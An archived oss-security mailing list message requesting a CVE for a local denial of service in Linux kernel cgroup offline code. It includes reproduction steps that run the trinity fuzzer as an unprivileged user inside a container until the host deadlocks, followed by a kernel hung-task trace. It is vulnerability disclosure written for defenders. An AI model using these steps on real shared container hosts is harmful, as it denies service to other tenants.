X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4179" "Friday" "4" "November" "2016" "14:17:29" "-0400" "CAI Qian" "caiqian@redhat.com" "<1679169912.3935010.1478283449963.JavaMail.zimbra@redhat.com>" "83" "[oss-security] CVE request: linux kernel - local DoS with cgroup offline code" nil nil nil "11" "2016110418:17:29" "[oss-security] CVE request: linux kernel - local DoS with cgroup offline code" (number mark "U       caiqian@redh Nov  4   83/4179  " thread-indent "\"[oss-security] CVE request: linux kernel - local DoS with cgroup offline code\"\n") "<1519719530.3927901.1478282148797.JavaMail.zimbra@redhat.com>" ("<1519719530.3927901.1478282148797.JavaMail.zimbra@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28092 invoked by uid 550); 4 Nov 2016 18:17:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28068 invoked from network); 4 Nov 2016 18:17:42 -0000
Date: Fri, 4 Nov 2016 14:17:29 -0400 (EDT)
From: CAI Qian <caiqian@redhat.com>
To: oss-security@lists.openwall.com
Message-ID: <1679169912.3935010.1478283449963.JavaMail.zimbra@redhat.com>
In-Reply-To: <1519719530.3927901.1478282148797.JavaMail.zimbra@redhat.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
X-Originating-IP: [10.18.41.13]
X-Mailer: Zimbra 8.0.6_GA_5922 (ZimbraWebClient - GC54 (Linux)/8.0.6_GA_5922)
Thread-Topic: CVE request: linux kernel - local DoS with cgroup offline code
Thread-Index: FheRjeYUN8IHGYLFYVrgtxnFhMPe3A==
Subject: [oss-security] CVE request: linux kernel - local DoS with cgroup offline code

A malicious user who can run an arbitrary image with a non-privileged user
in a Container-as-a-service cloud environment could use the exploit to
deadlock the container nodes to deny the service for other users.

This is confirmed to affect the latest mainline kernel (4.9-rc3) using this
kernel config, http://people.redhat.com/qcai/tmp/config-god-4.9rc2
and as old as v3.17. RHEL 7.3 kernel is not affected.

# docker run -it caiqian/rhel-tools bash
container> # su - test
container> $ ulimit -c 0
container> $ trinity -D --disable-fds=memfd --disable-fds=timerfd \
             --disable-fds=pipes --disable-fds=testfile \
             --disable-fds=sockets --disable-fds=perf \
             --disable-fds=epoll --disable-fds=eventfd \
             --disable-fds=drm

After 30-minute, interrupt (Ctrl-C) all the trinity processes, and then,

container> $ exit
container> # exit
# systemctl status docker
<hang...>
# systemctl reboot
Failed to start reboot.target: Connection timed out
See system logs and 'systemctl status reboot.target' for details.

After a while, lots of hang tasks on the console,
[ 5535.893675] INFO: lockdep is turned off.
[ 5535.898085] INFO: task kworker/45:4:146035 blocked for more than 120
seconds.
[ 5535.906059]       Tainted: G        W       4.8.0-rc8-fornext+ #1
[ 5535.912865] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables
this message.
[ 5535.921613] kworker/45:4    D ffff880853e9b950 14048 146035      2
0x00000080
[ 5535.929630] Workqueue: cgroup_destroy css_killed_work_fn
[ 5535.935582]  ffff880853e9b950 0000000000000000 0000000000000000
ffff88086c6da000
[ 5535.943882]  ffff88086c9e2000 ffff880853e9c000 ffff880853e9baa0
ffff88086c9e2000
[ 5535.952205]  ffff880853e9ba98 0000000000000001 ffff880853e9b968
ffffffff817cdaaf
[ 5535.960522] Call Trace:
[ 5535.963265]  [<ffffffff817cdaaf>] schedule+0x3f/0xa0
[ 5535.968817]  [<ffffffff817d33fb>] schedule_timeout+0x3db/0x6f0
[ 5535.975346]  [<ffffffff817cf055>] ? wait_for_completion+0x45/0x130
[ 5535.982256]  [<ffffffff817cf0d3>] wait_for_completion+0xc3/0x130
[ 5535.988972]  [<ffffffff810d1fd0>] ? wake_up_q+0x80/0x80
[ 5535.994804]  [<ffffffff8130de64>] drop_sysctl_table+0xc4/0xe0
[ 5536.001227]  [<ffffffff8130de17>] drop_sysctl_table+0x77/0xe0
[ 5536.007648]  [<ffffffff8130decd>] unregister_sysctl_table+0x4d/0xa0
[ 5536.014654]  [<ffffffff8130deff>] unregister_sysctl_table+0x7f/0xa0
[ 5536.021657]  [<ffffffff810f57f5>]
unregister_sched_domain_sysctl+0x15/0x40
[ 5536.029344]  [<ffffffff810d7704>] partition_sched_domains+0x44/0x450
[ 5536.036447]  [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111/0x1f0
[ 5536.043844]  [<ffffffff81167684>] rebuild_sched_domains_locked+0x64/0xb0
[ 5536.051336]  [<ffffffff8116789d>] update_flag+0x11d/0x210
[ 5536.057373]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450
[ 5536.064186]  [<ffffffff81167acb>] ? cpuset_css_offline+0x1b/0x60
[ 5536.070899]  [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd/0x10
[ 5536.077420]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450
[ 5536.084234]  [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25/0x220
[ 5536.091049]  [<ffffffff81167ae5>] cpuset_css_offline+0x35/0x60
[ 5536.097571]  [<ffffffff8115aa2c>] css_killed_work_fn+0x5c/0x220
[ 5536.104207]  [<ffffffff810bc83f>] process_one_work+0x1df/0x710
[ 5536.110736]  [<ffffffff810bc7c0>] ? process_one_work+0x160/0x710
[ 5536.117461]  [<ffffffff810bce9b>] worker_thread+0x12b/0x4a0
[ 5536.123697]  [<ffffffff810bcd70>] ? process_one_work+0x710/0x710
[ 5536.130426]  [<ffffffff810c3f7e>] kthread+0xfe/0x120
[ 5536.135991]  [<ffffffff817d4baf>] ret_from_fork+0x1f/0x40
[ 5536.142041]  [<ffffffff810c3e80>] ? kthread_create_on_node+0x230/0x230

Below is the full trace on ext4 (xfs also affected) and the sysrq-w report.
http://people.redhat.com/qcai/tmp/dmesg-ext4-cgroup-hang

This has already been reported to cgroup maintainers a few weeks ago, and
one of them mentioned that "cgroup is trying to offline a cpuset css, which
takes place under cgroup_mutex.  The offlining ends up trying to drain
active usages of a sysctl table which apprently is not happening." There is
no fix at this time as far as I can tell.
     CAI Qian
